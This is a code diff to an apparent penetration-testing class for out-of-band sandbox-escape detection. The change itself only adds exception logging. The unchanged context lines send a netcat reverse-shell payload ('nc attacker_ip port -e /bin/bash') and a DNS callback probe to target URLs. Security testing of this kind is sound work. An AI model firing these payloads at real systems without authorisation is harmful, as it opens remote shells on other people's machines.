@@ -7,6 +7,7 @@ import time
 import logging
 from urllib.parse import quote, urljoin
 from typing import List, Dict, Optional
+from app.core.logger import logger
 
 class MultiChannelOOBTester:
     """Multi-channel Out-of-Band testing for sandbox escapes"""
@@ -122,16 +123,18 @@ class MultiChannelOOBTester:
                     try:
                         await session.post(target_url, data={'code': payload}, timeout=3)
                         results.append({'type': 'netcat', 'payload': payload[:50]})
-                    except:
+                    except Exception as _exc:
                         pass
+                        logger.debug("Suppressed exception", exc_info=True)
         else:
             # Generic netcat
             payload = f"nc {attacker_ip} {port} -e /bin/bash"
             try:
                 await session.post(target_url, data={'cmd': payload}, timeout=3)
                 results.append({'type': 'netcat', 'payload': payload})
-            except:
+            except Exception as _exc:
                 pass
+                logger.debug("Suppressed exception", exc_info=True)
         
         return results
     
@@ -148,16 +151,18 @@ class MultiChannelOOBTester:
                     try:
                         await session.post(target_url, data={'code': payload}, timeout=3)
                         results.append({'type': 'dns', 'payload': payload[:50]})
-                    except:
+                    except Exception as _exc:
                         pass
+                        logger.debug("Suppressed exception", exc_info=True)
         else:
             # Generic DNS
             payload = f"nslookup {test_id}.{dns_domain}"
             try:
                 await session.post(target_url, data={'cmd': payload}, timeout=3)
                 results.append({'type': 'dns', 'payload': payload})
-            except:
+            except Exception as _exc:
                 pass
+                logger.debug("Suppressed exception", exc_info=True)
         
         return results
 
